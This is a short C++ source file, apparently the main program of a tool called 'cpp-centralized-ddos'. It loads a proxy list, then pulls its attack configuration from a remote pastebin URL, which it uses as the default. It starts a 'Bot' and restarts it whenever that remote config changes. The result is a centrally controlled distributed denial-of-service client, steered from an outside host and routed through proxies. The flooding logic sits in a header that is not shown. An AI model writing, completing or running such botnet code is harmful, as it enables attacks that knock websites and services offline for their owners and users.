#include "cpp-centralized-ddos.h"

void onConfigChanged() {

    Bot::stop();

    if (Config::localConfig.is_started) {

        this_thread::sleep_for(seconds(5));
        Bot::start();
    }
}

int main() {

    ProxyList::Init();

    string configUrl;

    cout << "Enter config [https://pastebin.com/raw/yHpxtU1U]: " << endl;
    getline(cin, configUrl);

    if (configUrl.empty()) {
        configUrl = "https://pastebin.com/raw/yHpxtU1U";
    }

    Config::Subscribe(onConfigChanged);
    Config::Init(configUrl);

    Config::Start();
    Bot::start();

    cin.get();
    return 0;
}
